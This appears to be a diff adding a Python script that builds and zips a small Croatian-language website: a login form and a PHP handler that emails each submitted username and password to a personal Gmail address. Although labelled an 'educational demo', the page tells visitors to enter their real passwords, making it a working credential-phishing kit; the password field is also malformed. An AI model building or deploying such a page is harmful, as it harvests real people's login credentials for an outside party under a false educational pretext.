@@ -1,0 +1,62 @@
+import os
+import zipfile
+
+# create files
+content_index = """<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>prijava</title>
+</head>
+<body>
+    <h2>username</h2>
+    <p>VAŽNO:unosite stvarne lozinke!</p>
+
+    <form action="send.php" method="POST">
+        <label>username:</label><br>
+        <input type="text" name="username" required><br><br>
+
+        <label>Demo password:</label><br>
+        <input type="text" password" required><br><br>
+
+        <button type="submit">Pošalji</button>
+    </form>
+</body>
+</html>
+"""
+
+content_php = """<?php
+$demoUsername = $_POST['username'];
+$demoPassword = $_POST['password'];
+
+$to = "simun.leko@gmail.com";
+$subject = "EDUKATIVNI DEMO – netko je unio podatke";
+
+$message = "Ovo je edukativni projekt.\\n\\nNetko je unio sljedeće podatke:\\n
+Demo korisničko ime: $demoUsername
+Demo lozinka: $demoPassword\\n
+Ovi podaci su izmišljeni i služe samo za prezentaciju.";
+
+$headers = "From: simun.leko@gmail.com";
+
+mail($to, $subject, $message, $headers);
+
+echo "Podaci su poslani! Provjeri svoj Gmail.";
+?>
+"""
+
+base_path = "/mnt/data/demo_site"
+os.makedirs(base_path, exist_ok=True)
+
+with open(os.path.join(base_path, "index.html"), "w") as f:
+    f.write(content_index)
+
+with open(os.path.join(base_path, "send.php"), "w") as f:
+    f.write(content_php)
+
+zip_path = "/mnt/data/demo_stranica.zip"
+with zipfile.ZipFile(zip_path, "w") as zipf:
+    zipf.write(os.path.join(base_path, "index.html"), arcname="index.html")
+    zipf.write(os.path.join(base_path, "send.php"), arcname="send.php")
+
+zip_path
